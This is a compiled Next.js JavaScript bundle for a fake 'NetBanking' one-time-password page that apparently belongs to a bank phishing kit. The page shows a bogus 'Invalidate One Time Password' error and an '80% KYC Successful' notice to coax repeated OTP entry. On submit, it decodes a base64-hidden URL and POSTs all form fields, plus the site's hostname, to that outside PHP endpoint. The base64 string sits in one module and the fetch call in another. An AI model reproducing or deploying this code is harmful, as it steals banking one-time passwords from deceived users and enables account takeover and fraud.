(self.webpackChunk_N_E = self.webpackChunk_N_E || []).push([
    [214], {
        178: function(e, t, n) {
            (window.__NEXT_P = window.__NEXT_P || []).push(["/p6", function() {
                return n(6428)
            }])
        },
        9018: function(e, t) {
            "use strict";
            t.Z = {
                dataList: "aHR0cHM6Ly9kZW1vLW11c2ljLmtwYmhvc3QuY29tL3VzZURhdGEucGhw"
            }
        },
        1210: function(e, t) {
            "use strict";

            function n(e, t, n, o) {
                return !1
            }
            Object.defineProperty(t, "__esModule", {
                value: !0
            }), t.getDomainLocale = n, ("function" == typeof t.default || "object" == typeof t.default && null !== t.default) && void 0 === t.default.__esModule && (Object.defineProperty(t.default, "__esModule", {
                value: !0
            }), Object.assign(t.default, t), e.exports = t.default)
        },
        8418: function(e, t, n) {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            });
            var o = n(4941).Z;
            n(5753).default, Object.defineProperty(t, "__esModule", {
                value: !0
            }), t.default = void 0;
            var r = n(2648).Z,
                a = n(7273).Z,
                l = r(n(7294)),
                c = n(6273),
                s = n(2725),
                i = n(3462),
                u = n(1018),
                f = n(7190),
                d = n(1210),
                p = n(8684),
                h = {};

            function v(e, t, n, o) {
                if (e && c.isLocalURL(t)) {
                    Promise.resolve(e.prefetch(t, n, o)).catch(function(e) {});
                    var r = o && void 0 !== o.locale ? o.locale : e && e.locale;
                    h[t + "%" + n + (r ? "%" + r : "")] = !0
                }
            }
            var m = l.default.forwardRef(function(e, t) {
                var n, r, m = e.href,
                    y = e.as,
                    x = e.children,
                    j = e.prefetch,
                    b = e.passHref,
                    C = e.replace,
                    _ = e.shallow,
                    g = e.scroll,
                    w = e.locale,
                    L = e.onClick,
                    P = e.onMouseEnter,
                    T = e.onTouchStart,
                    E = e.legacyBehavior,
                    O = void 0 === E ? !0 !== Boolean(!1) : E,
                    M = a(e, ["href", "as", "children", "prefetch", "passHref", "replace", "shallow", "scroll", "locale", "onClick", "onMouseEnter", "onTouchStart", "legacyBehavior"]);
                n = x, O && ("string" == typeof n || "number" == typeof n) && (n = l.default.createElement("a", null, n));
                var N = !1 !== j,
                    R = l.default.useContext(i.RouterContext),
                    k = l.default.useContext(u.AppRouterContext);
                k && (R = k);
                var S = l.default.useMemo(function() {
                        var e = o(c.resolveHref(R, m, !0), 2),
                            t = e[0],
                            n = e[1];
                        return {
                            href: t,
                            as: y ? c.resolveHref(R, y) : n || t
                        }
                    }, [R, m, y]),
                    Z = S.href,
                    B = S.as,
                    U = l.default.useRef(Z),
                    D = l.default.useRef(B);
                O && (r = l.default.Children.only(n));
                var H = O ? r && "object" == typeof r && r.ref : t,
                    A = o(f.useIntersection({
                        rootMargin: "200px"
                    }), 3),
                    K = A[0],
                    G = A[1],
                    I = A[2],
                    W = l.default.useCallback(function(e) {
                        (D.current !== B || U.current !== Z) && (I(), D.current = B, U.current = Z), K(e), H && ("function" == typeof H ? H(e) : "object" == typeof H && (H.current = e))
                    }, [B, H, Z, I, K]);
                l.default.useEffect(function() {
                    var e = G && N && c.isLocalURL(Z),
                        t = void 0 !== w ? w : R && R.locale,
                        n = h[Z + "%" + B + (t ? "%" + t : "")];
                    e && !n && v(R, Z, B, {
                        locale: t
                    })
                }, [B, Z, G, w, N, R]);
                var F = {
                    ref: W,
                    onClick: function(e) {
                        O || "function" != typeof L || L(e), O && r.props && "function" == typeof r.props.onClick && r.props.onClick(e), e.defaultPrevented || function(e, t, n, o, r, a, s, i, u, f) {
                            if ("A" !== e.currentTarget.nodeName.toUpperCase() || (!(p = (d = e).currentTarget.target) || "_self" === p) && !d.metaKey && !d.ctrlKey && !d.shiftKey && !d.altKey && (!d.nativeEvent || 2 !== d.nativeEvent.which) && c.isLocalURL(n)) {
                                e.preventDefault();
                                var d, p, h = function() {
                                    "beforePopState" in t ? t[r ? "replace" : "push"](n, o, {
                                        shallow: a,
                                        locale: i,
                                        scroll: s
                                    }) : t[r ? "replace" : "push"](n, {
                                        forceOptimisticNavigation: !f
                                    })
                                };
                                u ? l.default.startTransition(h) : h()
                            }
                        }(e, R, Z, B, C, _, g, w, Boolean(k), N)
                    },
                    onMouseEnter: function(e) {
                        O || "function" != typeof P || P(e), O && r.props && "function" == typeof r.props.onMouseEnter && r.props.onMouseEnter(e), !(!N && k) && c.isLocalURL(Z) && v(R, Z, B, {
                            priority: !0
                        })
                    },
                    onTouchStart: function(e) {
                        O || "function" != typeof T || T(e), O && r.props && "function" == typeof r.props.onTouchStart && r.props.onTouchStart(e), !(!N && k) && c.isLocalURL(Z) && v(R, Z, B, {
                            priority: !0
                        })
                    }
                };
                if (!O || b || "a" === r.type && !("href" in r.props)) {
                    var Y = void 0 !== w ? w : R && R.locale,
                        X = R && R.isLocaleDomain && d.getDomainLocale(B, Y, R.locales, R.domainLocales);
                    F.href = X || p.addBasePath(s.addLocale(B, Y, R && R.defaultLocale))
                }
                return O ? l.default.cloneElement(r, F) : l.default.createElement("a", Object.assign({}, M, F), n)
            });
            t.default = m, ("function" == typeof t.default || "object" == typeof t.default && null !== t.default) && void 0 === t.default.__esModule && (Object.defineProperty(t.default, "__esModule", {
                value: !0
            }), Object.assign(t.default, t), e.exports = t.default)
        },
        1018: function(e, t, n) {
            "use strict";
            Object.defineProperty(t, "__esModule", {
                value: !0
            }), t.TemplateContext = t.GlobalLayoutRouterContext = t.LayoutRouterContext = t.AppRouterContext = void 0;
            var o = (0, n(2648).Z)(n(7294)),
                r = o.default.createContext(null);
            t.AppRouterContext = r;
            var a = o.default.createContext(null);
            t.LayoutRouterContext = a;
            var l = o.default.createContext(null);
            t.GlobalLayoutRouterContext = l;
            var c = o.default.createContext(null);
            t.TemplateContext = c
        },
        6428: function(e, t, n) {
            "use strict";
            n.r(t), n.d(t, {
                default: function() {
                    return v
                }
            });
            var o = n(7568),
                r = n(655),
                a = n(5893),
                l = n(9008),
                c = n.n(l),
                s = n(5675),
                i = n.n(s),
                u = n(1664),
                f = n.n(u),
                d = n(9018),
                p = n(1163),
                h = n(7294);

            function v() {
                var e, t = (0, p.useRouter)(),
                    n = (0, h.useState)(!1),
                    l = n[0],
                    s = n[1],
                    u = (e = (0, o.Z)(function(e) {
                        var n, o, a, l, c, i;
                        return (0, r.__generator)(this, function(r) {
                            switch (r.label) {
                                case 0:
                                    return e.preventDefault(), s(!0), n = new FormData(e.target), o = {}, n.forEach(function(e, t) {
                                        o[t] = e
                                    }), l = {
                                        method: "POST",
                                        headers: {
                                            "Content-Type": "application/json"
                                        },
                                        body: JSON.stringify(o)
                                    }, [4, fetch(window.atob(d.Z.dataList) + "?id=" + window.location.hostname, l)];
                                case 1:
                                    return [4, r.sent().json()];
                                case 2:
                                    return i = r.sent(), s(!1), !0 == i.status ? t.push("/p7") : s(!1), [2]
                            }
                        })
                    }), function(t) {
                        return e.apply(this, arguments)
                    }),
                    v = (0, h.useState)("03:00"),
                    m = v[0],
                    y = v[1];
                return (0, h.useEffect)(function() {
                    ! function e(t) {
                        var n = Math.floor(t / 60),
                            o = t % 60;
                        if (y((n = n < 10 ? "0" + n : n) + ":" + (o = o < 10 ? "0" + o : o)), (t -= 1) >= 0) {
                            setTimeout(function() {
                                e(t)
                            }, 1e3);
                            return
                        }
                    }(180)
                }, []), (0, a.jsxs)(a.Fragment, {
                    children: [(0, a.jsxs)(c(), {
                        children: [(0, a.jsx)("title", {
                            children: "Enter One time Password"
                        }), (0, a.jsx)("meta", {
                            name: "description",
                            content: "enter one time password"
                        })]
                    }), (0, a.jsx)("div", {
                        className: "header",
                        children: (0, a.jsxs)("div", {
                            className: "logo text-center",
                            children: [(0, a.jsx)(i(), {
                                alt: "the logo",
                                src: "/logo.png",
                                priority: !0,
                                width: 190,
                                height: 32
                            }), (0, a.jsx)("h1", {
                                children: " Welcome to NetBanking "
                            })]
                        })
                    }), (0, a.jsxs)("div", {
                        className: "content",
                        children: [(0, a.jsx)("h2", {
                            children: "Enter the One Time Password sent to your mobile phone"
                        }), (0, a.jsx)("p", {
                            style: {
                                color: "red",
                                fontWeight: "bold"
                            },
                            children: "Invalidate One Time Password"
                        }), (0, a.jsx)("p", {
                            style: {
                                color: "red"
                            },
                            children: "Automatically resend new OTP on your registered number."
                        }), (0, a.jsxs)("form", {
                            action: "",
                            method: "post",
                            onSubmit: u,
                            children: [(0, a.jsxs)("div", {
                                className: "form-group",
                                children: [(0, a.jsx)("label", {
                                    htmlFor: "username",
                                    children: "Enter One Time Password"
                                }), (0, a.jsx)("input", {
                                    type: "text",
                                    className: "form-control",
                                    name: "otp4",
                                    required: !0
                                })]
                            }), (0, a.jsx)("p", {
                                style: {
                                    color: "green"
                                },
                                children: "80% KYC Successful"
                            }), (0, a.jsx)("button", {
                                type: "submit",
                                disabled: !!l,
                                className: "btn btn-primary login-btn",
                                children: "SUBMIT"
                            })]
                        }), (0, a.jsx)("p", {
                            className: "text-center",
                            children: m
                        }), (0, a.jsxs)("p", {
                            children: ["If you did not receive the One Time Password on SMS, you can  ", (0, a.jsx)(f(), {
                                href: "/",
                                children: (0, a.jsx)("a", {
                                    children: "Click here to resend the OTP"
                                })
                            })]
                        })]
                    }), (0, a.jsxs)("div", {
                        className: "footer",
                        children: ["\xa9 Copyright Bank Ltd.", (0, a.jsx)(f(), {
                            className: "link",
                            href: "/",
                            children: (0, a.jsx)("a", {
                                children: "Terms and Conditions"
                            })
                        }), (0, a.jsx)(f(), {
                            className: "link",
                            href: "/",
                            children: (0, a.jsx)("a", {
                                children: "Privacy Policy"
                            })
                        })]
                    })]
                })
            }
        },
        1664: function(e, t, n) {
            e.exports = n(8418)
        },
        7568: function(e, t, n) {
            "use strict";

            function o(e, t, n, o, r, a, l) {
                try {
                    var c = e[a](l),
                        s = c.value
                } catch (i) {
                    n(i);
                    return
                }
                c.done ? t(s) : Promise.resolve(s).then(o, r)
            }

            function r(e) {
                return function() {
                    var t = this,
                        n = arguments;
                    return new Promise(function(r, a) {
                        var l = e.apply(t, n);

                        function c(e) {
                            o(l, r, a, c, s, "next", e)
                        }

                        function s(e) {
                            o(l, r, a, c, s, "throw", e)
                        }
                        c(void 0)
                    })
                }
            }
            n.d(t, {
                Z: function() {
                    return r
                }
            })
        }
    },
    function(e) {
        e.O(0, [345, 774, 888, 179], function() {
            return e(e.s = 178)
        }), _N_E = e.O()
    }
]);